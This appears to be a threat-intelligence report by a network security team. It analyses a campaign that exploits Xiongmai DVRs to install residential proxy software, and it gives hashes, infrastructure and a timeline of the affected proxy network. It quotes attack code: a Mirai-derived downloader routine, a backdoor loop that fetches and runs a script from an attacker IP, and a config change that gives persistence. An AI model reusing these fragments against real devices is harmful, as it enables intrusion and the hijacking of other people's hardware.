# Pray4Bandwidth: Mirai meets the gig economy

**Nokia Deepfield Emergency Response Team (ERT)**

**First published: 2026-03-19**

---

## Summary

On March 17, Japan's NICTER (CSRI Analysis Team) [published](https://blog.nicter.jp/2026/03/iot_proxyware/) a detailed analysis of an ongoing campaign exploiting CVE-2024-3765 in Xiongmai DVRs to deploy commercial residential proxy SDKs. We recommend reading it first, as our analysis builds on theirs rather than replacing it. NICTER documented the vulnerability, the attack timeline, domain rotation patterns, and the affiliate credentials used for monetization. The campaign sits at an intersection we have been watching closely: IoT DDoS botnets and commercial residential proxy networks.

Building on NICTER's foundation, we retrieved the full payload chain from the staging servers (which remain live two days after publication) and decompiled all four UPX-packed ELF binaries. The binary analysis surfaces details that are complementary to NICTER's network-level observations:

- The custom downloader (`pppoe-cn`) is **Mirai-derived**, self-identifying as `MIRAI` on stdout at startup. All DDoS and scanning capability has been stripped. What remains is a minimal HTTP client and an embedded userspace ELF loader — Mirai reduced to a delivery truck.
- The proxy binary is **PacketSDK**, part of the **IPIDEA residential proxy network** that Google's Threat Intelligence Group (GTIG) [disrupted in January 2026](https://blog.google/threat-analysis-group/taking-legal-action-to-protect-people-from-ipidea/). The binary self-identifies as PacketSDK throughout its strings, built from the `packetshare-cli-cross` codebase, version 1.0.8.4. The domain rotation that NICTER documented — from `packetsdk[.]com` through randomized domains — reflects the PacketSDK product rebuilding its own command infrastructure after Google obtained a federal court order to seize its domains.
- The stager contains a **remote code execution backdoor** that polls for updates every 2 minutes, gated by a magic string. Currently dormant (HTTP 404), but activatable at any time.

The operator uses a `Pray4Palestine` User-Agent, a `pray4ukr[.]com` backdoor domain, and `prukr[.]site`/`prukr[.]store` infrastructure — cycling through geopolitical causes with the commitment of someone picking a Wi-Fi network name. The attacker IP traces to FPT Telecom in Vietnam.

## Attack chain

```
Attacker (58.186.204[.]40 — FPT Telecom, Vietnam)
  │
  │  CVE-2024-3765 on 34567/TCP
  │  echo-based shell dropper writes minimal fetch script
  ▼
pppoe-cn (Mirai-derived HTTP downloader, 67KB unpacked)
  │  GET /nw_updaten.sh HTTP/1.1
  │  Host: prukr[.]site
  │  User-Agent: Pray4Palestine
  ▼
nw_updaten.sh (9.8KB — main stager)
  ├─ System preparation
  │   ├── DNS → 8.8.8.8, 8.8.4.4, 1.1.1.1
  │   ├── Root password replaced (MD5crypt)
  │   ├── Install BusyBox, create awk/sed symlinks
  │   ├── Disable mount command (binary patching)
  │   └── Clear logs (/mnt/mtd/Log/Log)
  │
  ├─ Competitor removal
  │   ├── Kill: buituyen, configd, gg8ikc, dvrip.sh
  │   ├── Kill own prior instances
  │   └── Clean temp files across 10+ paths
  │
  ├─ Payload deployment
  │   ├── /var/upgrade ← IPRoyal Pawns CLI (2.0MB packed)
  │   ├── /var/pkda   ← PacketSDK v1.0.8.4 (749KB packed)
  │   └── /var/ntpdate ← legitimate ntpdate (deleted after use)
  │
  ├─ Persistence
  │   └── Hijacked PPPoE config → re-infects on every reconnect
  │
  └─ RCE backdoor
      └── Polls 154.26.133[.]93 every 120s for gated script execution
```

## Components

### pppoe-cn

| Field | Value |
|-------|-------|
| SHA-256 (packed) | `ada5388feb2cb3984abbc3fd494952117af77648164c2ce38723887833415310` |
| Size | 37KB packed → 67KB unpacked |
| Packer | UPX 4.02 |
| Architecture | ARM EABI5, musl libc, statically linked, stripped |
| Functions | 237 |
| Self-ID | `MIRAI` (0x1e7e0) |
| User-Agent | `Pray4Palestine` |

At the network level, this binary behaves as an HTTP downloader. Unpacking and decompilation reveal its lineage: it is a stripped-down Mirai binary. It writes `MIRAI\n` to stdout on startup, then does exactly one thing: fetch a file over HTTP and write it to disk. The entire Mirai arsenal — scanner, C2 command handler, attack methods — has been gutted, leaving a 67KB delivery stub. Mirai, stripped for parts.

What it retains beyond simple downloading:

1. **Embedded userspace ELF loader**: validates ARM ELF headers, handles `R_ARM_PC24` relocations, manages shared library loading. Can load downloaded binaries in-process without `exec()` or the kernel's ELF loader, avoiding filesystem artifacts.

2. **Device fingerprinting**: reads `/proc/stat`, `/proc/cpuinfo`, `/sys/devices/system/cpu`. This feeds the memory query parameter in the stager (`/pkda?f=$TOTAL_MEM`); the PacketSDK binary is skipped on devices with < 10MB RAM.

The download protocol:

```c
write(1, "MIRAI\n", 6);
fd = open(argv[5], O_CREAT|O_WRONLY|O_TRUNC, 0777);
sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock, {AF_INET, htons(atoi(argv[2])), inet_addr(argv[1])});
write(sock, "GET ");
write(sock, argv[4]);                          // path
write(sock, " HTTP/1.1\r\n");
write(sock, "Host: ");
write(sock, argv[3]);                          // host header (separate from IP)
write(sock, "\r\nUser-Agent: Pray4Palestine");
write(sock, "\r\nConnection: close\r\n\r\n");

do { read(sock, buf, 1); } while (window != 0x0d0a0d0a);  // skip headers
while (read(sock, buf, 128) > 0) { write(fd, buf); }
```

Usage: `pppoe-cn <server_ip> <port> <host_header> <path> <output_file>`

### Stager (nw_updaten.sh)

A 9.8KB BusyBox shell script that orchestrates the full compromise.

**Competitor awareness.** The stager kills processes matching `buituyen` (Vietnamese name), `configd`, `gg8ikc`, and `dvrip.sh` before deploying its own payloads — there can be only one proxy operator per DVR. It also kills its own prior instances by grepping for its own affiliate keys in the process table — killing yourself to avoid running twice is operationally sound, if existentially bleak.

**Mount disabling.** After deployment, the stager patches the BusyBox binary to remove `mount` (`sed -i 's/mount/     /g' /var/busybox`), then bind-mounts the patched version over `/bin/busybox`. This prevents other actors from using `mount` to inspect or override bind-mounted files. Destroying a system utility to protect your own files from competitors is the DVR equivalent of burning the ladder behind you.

**Selective deployment.** PacketSDK is skipped on devices with < 10MB RAM, but Pawns-CLI always runs. Even the smallest DVR gets to contribute to the gig economy.

### RCE backdoor

The stager spawns a persistent update loop at `/var/ud`:

```sh
while true; do
    /mnt/mtd/Config/ppp/pppoe-cn 154.26.133.93 80 pray4ukr.com /newn /var/news
    if [ -f /var/news ]; then
        while read p; do
            case $p in (*<REDACTED>*)
                chmod 777 /var/news
                sh /var/news
            ;;esac
        done < /var/news
    fi
    sleep 120
done
```

The response is only executed if it contains a hardcoded magic string (redacted — available to defenders on request). Currently returns HTTP 404 — dormant, but activatable across the entire fleet with a single file upload. `pray4ukr[.]com` is NXDOMAIN; the operator uses the raw IP with a virtual host header, making the domain purely decorative — a geopolitical bumper sticker on a backdoor.

### PPPoE persistence

NICTER documented this mechanism. The single-line diff tells the story concisely:

```diff
-  exec /usr/sbin/pppd_3g -detach user $ACCOUNT password $PASSWORD ...
+  echo "pppoe enable";/mnt/mtd/Config/ppp/ppp.sh;exit 0;
```

Every PPPoE reconnection re-downloads and re-executes the full stager chain. The DVR's firmware helpfully runs the attacker's script every time the network comes back up — vendor-assisted persistence.

### IPRoyal Pawns CLI

| Field | Value |
|-------|-------|
| SHA-256 (packed) | `2d37a69159182ebf4968c72514a39b37800e18538e766697a8c74c5c6370e6f7` |
| Size | 2.0MB packed → 6.9MB unpacked |
| Packer | UPX 3.94 |
| Language | Go (full crypto/tls stack, FIPS 140 refs, embedded CA bundle) |

Stock IPRoyal Pawns CLI binary with the full EULA embedded. Affiliate credentials are documented in the [NICTER report](https://blog.nicter.jp/2026/03/iot_proxyware/).

The `-device-name` flag is set to the device's total memory in KB, likely for tracking in the IPRoyal dashboard. The `-accept-tos` flag dutifully accepts the terms of service — consent by proxy, in every sense.

### PacketSDK v1.0.8.4 (IPIDEA)

| Field | Value |
|-------|-------|
| SHA-256 (packed) | `53b81a57cc81f6a4be9e01e681fac08e2d910814eada4a872824d0c671f96a32` |
| Size | 749KB packed → 3.0MB unpacked |
| Packer | UPX 3.95 |
| Language | C++ (Boost.Asio, Boost.Beast, spdlog) |
| Build path | `/home/user/packetshare-cli-cross/app/packet_sdk/` |
| Affiliate key | *(see [NICTER report](https://blog.nicter.jp/2026/03/iot_proxyware/))* |
| Internal architecture | `GetDispatchHostName` → `DispatchTCP` → `ProxyControlTcp` → `TCPTunnel` |

The build path identifies the codebase as `packetshare-cli-cross` (a predecessor or internal name), but the shipping product is **PacketSDK**, part of the **IPIDEA residential proxy network**. Google's GTIG [disrupted IPIDEA in January 2026](https://blog.google/threat-analysis-group/taking-legal-action-to-protect-people-from-ipidea/), obtaining a federal court order to seize domains including `packetsdk[.]com` — which explains the domain rotation that NICTER documented. Google's report also documented device overlap between IPIDEA enrollment and **Aisuru** and **Kimwolf** botnets, both tracked in this repository.

**Seed info decryption.** The binary bootstraps by fetching an encrypted configuration from `seed-info.oss-ap-southeast-1.aliyuncs[.]com/info.txt` (Alibaba Cloud OSS). The payload is base64-encoded, encrypted with a custom scheme: a 13-byte nonce and 13-byte timestamp are appended to the ciphertext, the nonce is XOR'd with the hardcoded key `12345678900987654321`, and the main data is XOR'd with the MD5 hex digest of (timestamp + nonce + key). The custom XOR cipher with MD5 key derivation is more effort than that key deserves. Current decrypted content:

```json
{"dispatch_host_name": ["eccbc87e4b5ce2fe.com", "c4ca4238a0b92382.com", "636f067f89cc1486.com"]}
```

The dispatch domains are truncated MD5 hashes of integers (`c4ca4238a0b92382` = MD5("1")[:16], `eccbc87e4b5ce2fe` = MD5("3")[:16]) — security through the assumption that nobody will hash single digits. None currently resolve. The embedded timestamp (2025-07-23) predates Google's January 2026 takedown by six months — this seed has not been refreshed since, suggesting the bootstrap path is effectively dead. The SDK's fallback domain `storemidnet[.]com` (hardcoded in the binary) is also NXDOMAIN.

### ntpdate

Legitimate ntpdate 4.2.0a (GCC 10.2.1, musl libc). Used to sync the clock via `time.apple.com`, then deleted. No modifications. Syncing the clock before deploying proxy software on someone else's DVR is a curiously conscientious touch.

## Infrastructure

### Active servers (payloads live as of 2026-03-19)

| IP | Hostname | Provider | Payload paths |
|----|----------|----------|---------------|
| 31.97.218[.]25 | prukr[.]site | Hostinger US | /update, /nw_updaten.sh, /pppoe-cn |
| 154.26.133[.]93 | — | Cogent/IPXO | /pkda, /update, /nw_updaten.sh, /pppoe-cn, /ntpdate, /3gdigal, /3gdigal1, /pppn.sh |

Both run nginx on Ubuntu. 154.26.133[.]93 hosts the full set; 31.97.218[.]25 hosts a subset (no PacketSDK).

### Domains

**Attacker infrastructure** — domains controlled by the campaign operator:

| Domain | Status | Role |
|--------|--------|------|
| prukr[.]site | Live → 31.97.218[.]25 | Primary payload server (current) |
| prukr[.]store | Live → 154.26.133[.]93 | Secondary domain in pppn.sh |
| pray4ukr[.]com | NXDOMAIN | RCE backdoor Host header |

**PacketSDK / IPIDEA infrastructure** — domains belonging to the proxy SDK product. NICTER documents the full domain rotation timeline from `packetsdk[.]com` through randomized domains to `storemidnet[.]com`. This rotation reflects the PacketSDK product rebuilding its command infrastructure after Google seized its domains in January 2026, rather than attacker-managed C2. Our binary analysis confirms `storemidnet[.]com` is also hardcoded as the SDK's fallback domain. We add the following from seed info decryption:

| Domain | Status | Role |
|--------|--------|------|
| seed-info.oss-ap-southeast-1.aliyuncs[.]com | Live | Alibaba Cloud OSS — encrypted dispatch config |
| eccbc87e4b5ce2fe[.]com | NXDOMAIN | Dispatch domain from seed (MD5("3")[:16]) |
| c4ca4238a0b92382[.]com | NXDOMAIN | Dispatch domain from seed (MD5("1")[:16]) |
| 636f067f89cc1486[.]com | NXDOMAIN | Dispatch domain from seed |

## Credentials

NICTER documented the IPRoyal and PacketSDK affiliate credentials ([source](https://blog.nicter.jp/2026/03/iot_proxyware/)). Additional indicators from our analysis:

| Indicator | Type | Context |
|-----------|------|---------|
| *(redacted)* | Magic string | RCE backdoor execution gate (available on request) |
| *(redacted)* | MD5crypt | Replaced root password (enables telnet re-access) |
| `Pray4Palestine` | User-Agent | pppoe-cn HTTP requests |

## File hashes

Retrieved from live servers (2026-03-19):

```
ada5388feb2cb3984abbc3fd494952117af77648164c2ce38723887833415310  pppoe-cn
a6e2d5674470f41571c2d223b9fb61841bc9c533db604ce835b615dc9777555c  ntpdate
2d37a69159182ebf4968c72514a39b37800e18538e766697a8c74c5c6370e6f7  update (Pawns)
53b81a57cc81f6a4be9e01e681fac08e2d910814eada4a872824d0c671f96a32  pkda (PacketSDK)
30ce19957cb4eb7357e5bbecd09add39d0d27dcf66ef866d9943ac786ca0641e  nw_updaten.sh
a1e8e3b0b1c1d7a7bc92ff37a9ff6df05cfaf37f8537890d12525e4c406d54ca  pppn.sh
bf84831efed12d02f022807049722980d564e4315408855c5f3330b2585078a6  3gdigal (hijacked)
ccad7c4a021003a4d5eafb17062af9334010588f0b6901466cd06adc59013483  3gdigal1 (original)
```

From NICTER report (not retrieved): `d3b35bf3...` (Pawns Jan), `0e5a4079...` (PacketSDK v1.0.2 Jan), `3288b7dc...` (PacketSDK v1.0.6 Feb).

## Assessment

The choice to strip DDoS capability entirely — rather than running both, as other operators do — is a revealed preference worth noting. An operator with a working Mirai exploit chain decided that residential proxy revenue alone justified the operation. If DDoS-for-hire were more profitable, the attack code would still be there. This suggests that for at least some operators, passive bandwidth resale now outearns active DDoS services — a shift with implications for how we model the IoT threat landscape.

NICTER's IOC timeline, combined with our binary analysis, provides a version-by-version view of Google's IPIDEA takedown rippling through a single affiliate:

| Date | PacketSDK | Domains | What changed |
|------|-----------|---------|--------------|
| January 2026 | v1.0.2 | packetsdk[.]com/xyz/net/io | Original infrastructure intact |
| *January 2026* | — | — | *Google obtains court order, seizes packetsdk[.]com* |
| February 5 | v1.0.6 | 3 randomized domains, pkdsdk[.]com | IPIDEA scrambles — new domains, new distribution site |
| February 24 | v1.0.8.4 | storemidnet[.]com | Down to a single fallback domain |
| February 27 | *(not deployed)* | — | Only Pawns-CLI observed by NICTER |
| March 19 (this report) | v1.0.8.4 | All dispatch NXDOMAIN | Seed stale, fallback dead, no hardcoded IP — SDK in retry loop |

Each SDK update shipped with fewer working domains. By February 27, NICTER stopped observing PacketSDK deployments entirely. Our decompilation of v1.0.8.4 confirms the terminal state for this version: the SDK's bootstrap chain — seed dispatch domains → `storemidnet[.]com` → retry — has no hardcoded IP fallback. Every path is NXDOMAIN. The SDK sits in an indefinite retry loop with no route to its dispatch servers. Google's domain seizures broke the dispatch chain in every SDK version this operator has deployed. The binaries keep shipping; the infrastructure they point to does not exist.

The attacker's own infrastructure is limited to three domains (`prukr[.]site`, `prukr[.]store`, `pray4ukr[.]com`) and two IPs. The PacketSDK domains indicate IPIDEA enrollment but do not uniquely fingerprint this operator — they are commercial SDK infrastructure shared across all affiliates.

Google's IPIDEA report documented that devices enrolled in PacketSDK were also found in Aisuru and Kimwolf botnets — both tracked in this repository. This campaign represents a third, operationally independent vector enrolling IoT devices into the same proxy network. The convergence is the SDK, not the operator.

The dormant RCE backdoor is Chekhov's gun: introduced in Act I of a proxy monetization campaign, it has yet to fire. It provides a mechanism to pivot from passive bandwidth resale to arbitrary code execution across the entire fleet, at any time, with a single file upload. The proxy revenue pays the rent; the backdoor keeps the options open.

The full payload chain remains live on both staging servers, and the operator continues deploying the v1.0.8.4 PacketSDK binary despite its dispatch chain being broken. If IPIDEA distributes a newer SDK with working dispatch infrastructure, these devices could come back online as proxy nodes overnight — the stager re-downloads on every PPPoE reconnect. Until then, only IPRoyal Pawns is earning. The redundancy this operator designed for has become a single point of failure.
